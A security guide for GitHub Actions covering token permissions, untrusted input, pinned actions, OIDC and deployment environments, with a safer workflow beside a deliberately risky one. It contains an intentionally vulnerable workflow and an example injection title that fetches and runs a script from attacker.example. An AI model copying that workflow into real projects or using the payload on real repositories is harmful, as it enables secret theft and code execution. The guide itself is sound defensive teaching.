---
id: lh-github-actions-security
slug: github-actions-security
title: 'GitHub Actions Security: How to Protect Your Deployment Pipeline'
description: Secure GitHub Actions workflows with least-privilege tokens, safe handling of untrusted input, pinned actions, OIDC, and protected deployment environments.
category: deployment-guides
tags: [github-actions, ci-cd, security, deployment, supply-chain]
authorId: henson-sagorsor
status: published
publishedAt: '2026-11-20'
difficulty: intermediate
commentsEnabled: true
adEligible: false
socialImage: /assets/blog/social/github-actions-security.png
testedEnvironment:
  summary: >-
    The risky and safer example workflows were checked with actionlint 1.7.12 and zizmor 1.32.0
    (offline mode) in a disposable python:3.13-slim Docker container, and the actions/checkout
    commit SHA was confirmed against the repository's v4.3.0 tag. The workflows were not run on
    GitHub, and the OIDC, environment, and repository settings were not configured for this
    guide.
  verifiedAt: '2026-11-20'
references:
  - title: GitHub Docs — Secure use reference for GitHub Actions
    url: https://docs.github.com/en/actions/reference/security/secure-use
  - title: GitHub Docs — Workflow syntax (permissions)
    url: https://docs.github.com/en/actions/reference/workflows-and-actions/workflow-syntax
  - title: GitHub Docs — Use GITHUB_TOKEN for authentication in workflows
    url: https://docs.github.com/en/actions/tutorials/authenticate-with-github_token
  - title: GitHub Docs — OpenID Connect
    url: https://docs.github.com/en/actions/concepts/security/openid-connect
  - title: GitHub Docs — Configuring OpenID Connect in cloud providers
    url: https://docs.github.com/en/actions/how-tos/secure-your-work/security-harden-deployments/oidc-in-cloud-providers
  - title: GitHub Docs — Managing environments for deployment
    url: https://docs.github.com/en/actions/how-tos/deploy/configure-and-manage-deployments/manage-environments
  - title: GitHub Docs — Keeping your actions up to date with Dependabot
    url: https://docs.github.com/en/code-security/how-tos/secure-your-supply-chain/secure-your-dependencies/auto-update-actions
  - title: 'GitHub Security Lab — Keeping your GitHub Actions and workflows secure Part 1: Preventing pwn requests'
    url: https://securitylab.github.com/resources/github-actions-preventing-pwn-requests/
  - title: GitHub Advisory — tj-actions/changed-files secrets exposure (CVE-2025-30066)
    url: https://github.com/advisories/GHSA-mrrh-fwg8-r2c3
  - title: CISA — Supply Chain Compromise of Third-Party tj-actions/changed-files (March 2025)
    url: https://www.cisa.gov/news-events/alerts/2025/03/18/supply-chain-compromise-third-party-tj-actionschanged-files-cve-2025-30066-and-reviewdogaction
  - title: actionlint
    url: https://github.com/rhysd/actionlint
  - title: zizmor documentation
    url: https://docs.zizmor.sh/
---

A deployment pipeline usually holds the most powerful credentials a project has: tokens that can push code, publish packages, and change production. That makes your GitHub Actions workflows a target in their own right. An attacker who can make your workflow run their code does not need to break into your server; the pipeline will deploy for them.

This guide explains how workflows get attacked and walks through a risky workflow line by line, then shows a safer version and the free tools that catch the difference.

## What you will learn

By the end of this guide you should be able to:

- **Identify** the main ways a GitHub Actions workflow can be abused: untrusted input, dangerous triggers, third-party actions, and over-powered tokens.
- **Configure** least-privilege `GITHUB_TOKEN` permissions and pass untrusted input safely.
- **Explain** why pinning actions to a commit SHA matters, using a real 2025 incident.
- **Replace** long-lived cloud secrets with OpenID Connect and protect deployments with environments.
- **Verify** your workflows with actionlint and zizmor.

## Before you begin

You should be able to read a workflow file in `.github/workflows/` and know what `on:`, `jobs:`, `steps:`, `uses:`, and `run:` do. A few terms:

- **`GITHUB_TOKEN`** is a token GitHub creates for each job in a workflow run so the job can call the GitHub API, for example to comment on a pull request or push a commit.
- An **action** is a reusable step, referenced with `uses:`. Many come from third parties.
- A **runner** is the machine that runs a job: GitHub-hosted, or self-hosted on your own hardware.

## How workflows get attacked

Most real problems fall into four groups:

1. **Untrusted input in commands.** Pull request titles, branch names, issue bodies, and commit messages are written by whoever opened them. If a workflow pastes them into a shell command, the author can run commands.
2. **Privileged triggers that run untrusted code.** Some triggers give a workflow write access and secrets even when it was started by someone outside your project.
3. **Third-party actions.** An action runs with the same access as the rest of the job. If its code changes under you, your secrets go with it.
4. **Over-powered credentials.** A token with write access to everything, or a cloud key that never expires, turns a small mistake into a full compromise.

### Case study: tj-actions/changed-files (March 2025)

`tj-actions/changed-files` was a popular action; GitHub's advisory notes that over 23,000 repositories used it. Between 14 and 15 March 2025, attackers retroactively changed multiple version tags of the action to point to a malicious commit. The malicious code read secrets from the runner's memory and printed them in the workflow logs, which are public for public repositories. The flaw is tracked as CVE-2025-30066, and the fixed release was 46.0.1.

Every workflow that referenced the action by a tag, such as `@v45`, and ran during that window ran the attacker's code without any change to its own files. CISA's advice to affected projects was to identify affected repositories and exposed secrets, and to "rotate all identified secrets immediately as they should be considered compromised."

Tags are just movable labels. A full commit SHA is not; it identifies one exact version of the code. A pin covers only that action's own code, though: if the action itself pulls other actions or container images by tag, those can still change. CISA's alert for this incident also names a second compromised action, `reviewdog/action-setup`.

## A risky workflow, line by line

This workflow looks reasonable and does something useful: it tests incoming pull requests and thanks the author. It is also dangerous in five ways. It is an illustration; do not use it.

```yaml
name: Triage pull request
on:
  pull_request_target:
    types: [opened, edited]
permissions: write-all
jobs:
  triage:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v4
        with:
          ref: ${{ github.event.pull_request.head.sha }}
      - run: npm install && npm test
      - name: Greet
        run: echo "Thanks for '${{ github.event.pull_request.title }}'"
```

1. **`pull_request_target`** runs in the context of the target repository, with access to its secrets and a write-capable token, even for pull requests from forks. GitHub Security Lab describes combining it with a checkout of the pull request's code as "a dangerous practice that may lead to repository compromise."
2. **Checking out the pull request's code** with `ref: ...head.sha` means `npm install && npm test` runs code written by the pull request author: install scripts, test files, anything. With the privileged trigger, that code runs with your secrets.
3. **`permissions: write-all`** gives the token write access to every scope, so whatever runs can push code, change releases, and more.
4. **`${{ github.event.pull_request.title }}` inside `run:`** is pasted into the shell script before it runs. A title such as `$(curl -s https://attacker.example/s.sh | sh)` is expanded by the shell, so the greeting downloads and runs the attacker's script.
5. **`actions/checkout@v4`** is a movable tag. It is a trusted publisher, but the principle from the tj-actions incident applies to every action.

Both scanners used for this guide flagged the risky workflow. actionlint reported the injection:

```text
"github.event.pull_request.title" is potentially untrusted. avoid using it directly in inline scripts. instead, pass it through an environment variable.
```

zizmor reported `dangerous-triggers`, `template-injection`, and `unpinned-uses` as errors and `artipacked` (credentials left on disk by checkout) as a warning. Its stricter `--persona=pedantic` mode also reported `excessive-permissions` for `write-all`.

## A safer version

```yaml
name: Test pull request
on:
  pull_request:
    types: [opened, edited, synchronize]
permissions:
  contents: read
jobs:
  test:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@08eba0b27e820071cde6df949e0beb9ba4906955 # v4.3.0
        with:
          persist-credentials: false
      - run: npm ci --ignore-scripts && npm test
      - name: Greet
        env:
          PR_TITLE: ${{ github.event.pull_request.title }}
        run: echo "Thanks for '$PR_TITLE'"
```

What changed, and why:

- **`pull_request` instead of `pull_request_target`.** By default, for pull requests from forks, this trigger gives the workflow a read-only token and no repository secrets, so running the contributor's tests is far less dangerous. (Private repositories have settings that can send write tokens or secrets to fork workflows; leave them off.)
- **`permissions: contents: read`.** When you set any permission, every permission you do not list is set to `none`. The job can read the code and nothing else.
- **The title goes through an environment variable.** GitHub's documentation calls this the preferred approach for inline scripts. The shell receives `$PR_TITLE` as data and does not execute it.
- **The action is pinned to a full commit SHA**, with the version in a comment for humans. The SHA above was confirmed against the `v4.3.0` tag of `actions/checkout`.
- **`persist-credentials: false`** stops checkout from leaving the token in the repository's Git configuration, where later steps could read it.
- **`npm ci --ignore-scripts`** installs from the lockfile without running dependency install scripts. [Software Supply Chain Attacks: The Hidden Risks in npm Packages](/blog/npm-supply-chain-security) explains why.

actionlint reported nothing for this version, and zizmor, with its default settings, reported "No findings to report" (it noted two suppressed low-confidence findings).

## Practices for every repository

### Give GITHUB_TOKEN the least privilege

Add a top-level `permissions` block to every workflow, starting from `contents: read` and adding only what a job needs. A job-level block replaces the top-level one rather than adding to it, which is why `contents: read` is repeated in this excerpt:

```yaml
permissions:
  contents: read

jobs:
  label:
    runs-on: ubuntu-latest
    permissions:
      contents: read
      pull-requests: write
    steps:
      - run: echo "label the pull request here"
```

Also set the default for the repository or organization to read-only in the Actions settings, so a workflow without a `permissions` block does not get write access. GitHub's secure use guidance recommends exactly that default.

### Treat every event field as untrusted

Any value a user can type, including titles, bodies, branch names, labels, and commit messages, must reach a `run:` script only through `env:`. The same applies to inputs for actions that build shell commands.

### Avoid privileged triggers unless you need them

GitHub's guidance is to avoid `pull_request_target` if it is not necessary. If you need it, for example to label pull requests from forks, never check out or run the pull request's code in that workflow. GitHub Security Lab suggests splitting the work: an unprivileged `pull_request` workflow does the build and saves results as an artifact, and a separate `workflow_run` workflow with write access acts on those results. `workflow_run` is privileged too, so treat the artifact's contents as untrusted data: never execute it or paste it into `run:`.

### Pin and update third-party actions

Pin each third-party action to a full-length commit SHA, and keep the pins current with Dependabot, which can open pull requests for outdated actions:

```yaml
# .github/dependabot.yml
version: 2
updates:
  - package-ecosystem: 'github-actions'
    directory: '/'
    schedule:
      interval: 'weekly'
```

One trade-off from GitHub's documentation: Dependabot does not create security alerts for actions pinned to SHAs, so read the update pull requests rather than waiting for alerts. GitHub's [secure use reference](https://docs.github.com/en/actions/reference/security/secure-use) now also describes locking workflow dependencies with a lockfile (`.github/workflows/actions.lock`, generated by the `gh actions-lock` extension), which it calls the strongest protection available and which covers what SHA pins alone do not. Check that page for whether it is available for your repositories.

### Use OpenID Connect instead of stored cloud keys

Instead of saving a long-lived cloud access key as a repository secret, configure your cloud provider to trust GitHub's OpenID Connect (OIDC) tokens. The workflow requests a short-lived access token that, in GitHub's words, is only valid for a single job. There is no stored key to leak or rotate. The job needs this permission:

```yaml
permissions:
  id-token: write
  contents: read
```

`id-token: write` lets the job request the identity token; it does not grant write access to the repository. On the cloud side, restrict the trust to your repository and, ideally, a specific branch or environment.

### Protect deployments with environments

A GitHub **environment**, such as `production`, can require approval from named reviewers before a job that uses it runs. Secrets stored on the environment are released only after those rules pass:

```yaml
jobs:
  deploy:
    runs-on: ubuntu-latest
    environment: production
    steps:
      - run: ./deploy.sh
```

You can also restrict which branches may deploy to the environment and prevent people from approving their own deployments. Note two limits from GitHub's documentation: on the Free plan, environments are available only for public repositories, and anyone who can edit workflows can create environments from a workflow file. Protect the workflow files themselves: use a CODEOWNERS entry for `.github/workflows/` plus a branch protection rule or ruleset that requires that review. Because anyone with write access can still push a changed workflow to another branch, keep production secrets in environments that only protected branches can deploy to.

### Keep self-hosted runners away from public repositories

GitHub's guidance is that self-hosted runners should almost never be used for public repositories, because anyone who can open a pull request may be able to run code on your machine, and that machine may keep files and credentials between jobs.

### Scan workflows automatically

Run the scanners used in this guide locally or in CI:

```bash
actionlint
zizmor .github/workflows/
```

actionlint checks workflow syntax, expressions, and shell scripts, and flags script injection. zizmor focuses on security findings such as dangerous triggers, injection, unpinned actions, and token permissions. Together they flagged every problem in the risky example above in seconds (zizmor needs `--persona=pedantic` to report `write-all`). Neither checks your OIDC trust settings, environments, or runner choices, and neither replaces review.

## If a workflow or action is compromised

1. **Rotate every secret the workflow could reach**, including repository, organization, and environment secrets, and any cloud credentials. Assume they were taken.
2. **Read the logs.** Check recent runs of affected workflows for unexpected output or network calls; for public repositories, assume anyone could read them.
3. **Look for persistence:** new workflows, deploy keys, collaborators, releases, or packages you did not create.
4. **Fix the cause:** remove or pin the bad action, tighten permissions, and change the trigger.

## Common mistakes and misconceptions

- **"Only maintainers can trigger our workflows."** Anyone can open a pull request or issue on a public repository, and some triggers run with your secrets.
- **"Secrets are masked in logs, so they're safe."** Masking hides exact matches in log output. It does not stop code in your job from sending a secret elsewhere, or from printing it in an altered form.
- **"A version tag is a fixed release."** Tags can be moved, as the tj-actions incident showed.
- **"Private repositories don't need this."** Contributors, dependencies, and third-party actions still run in your pipeline.

## Check your understanding

Try to answer each question before reading the answers below.

1. Why is `run: echo "${{ github.event.issue.title }}"` dangerous, and what is the fix?
2. A workflow uses `pull_request_target` to label pull requests. A contributor suggests adding a step that runs `npm test` on the pull request's code. Why should you refuse?
3. You set `permissions: { issues: write }` on a job. Can the job push commits?
4. What does pinning `uses:` to a full commit SHA protect against that pinning to `@v4` does not?

**Answers**

1. The title is inserted into the script before the shell runs, so a crafted title becomes a command. Pass it through `env:` and reference the variable.
2. The trigger runs with a write-capable token and secrets, so the contributor's code would run with your privileges.
3. No. Once any permission is set, unlisted permissions are `none`, so `contents` has no access.
4. A tag can be moved to point at different code; a SHA always refers to the same commit of that action (though not to anything the action itself pulls in by tag).

## Key takeaways

- Treat your pipeline as production: it holds production's keys.
- Start every workflow at `contents: read` and add permissions per job.
- Never paste event fields into `run:`; pass them through `env:`.
- Avoid `pull_request_target`, pin third-party actions to SHAs, and keep them updated.
- Prefer OIDC to stored cloud keys, gate deployments with environments, and scan workflows with actionlint and zizmor.

## Related guides

- [Software Supply Chain Attacks: The Hidden Risks in npm Packages](/blog/npm-supply-chain-security)
- [How to Protect Environment Variables and API Keys in Production](/blog/protect-environment-variables-api-keys)
- [What Is DevSecOps? A Beginner's Guide to Secure Software Deployment](/blog/what-is-devsecops)
- [How to Secure a Node.js Application Before Production Deployment](/blog/secure-nodejs-before-production)
